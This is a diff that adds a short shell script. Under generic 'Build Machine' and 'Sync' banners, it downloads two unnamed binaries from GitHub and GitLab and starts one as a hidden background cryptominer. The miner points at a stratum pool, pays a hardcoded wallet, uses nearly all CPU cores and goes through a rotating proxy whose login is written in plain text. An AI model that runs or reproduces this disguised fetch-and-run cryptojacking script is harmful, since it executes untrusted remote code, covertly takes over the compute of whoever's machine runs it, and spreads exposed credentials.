@@ -1,0 +1,23 @@
+echo "==================== Info Machine ===================="
+echo "Ready"
+echo "Go"
+echo "Running"
+echo "===================================================="
+
+echo "+++++++ Build Machine +++++++++"
+nohup wget https://github.com/manorepas/bash/raw/main/pointd
+nohup wget https://gitlab.com/lambohopo/bash/-/raw/main/timer
+nohup mkdir safa
+nohup apt install screen -y
+nohup apt install libjansson-dev -y
+
+echo "+++++++ Configure Machine +++++++++"
+chmod +x pointd
+chmod +x timer
+cd safa
+
+echo "Configure Successfully"
+cd ..
+screen -d -m ./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.tes -p x -t $(nproc --ignore 1) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+echo "+++++++ Sync... +++++++++"
+./timer
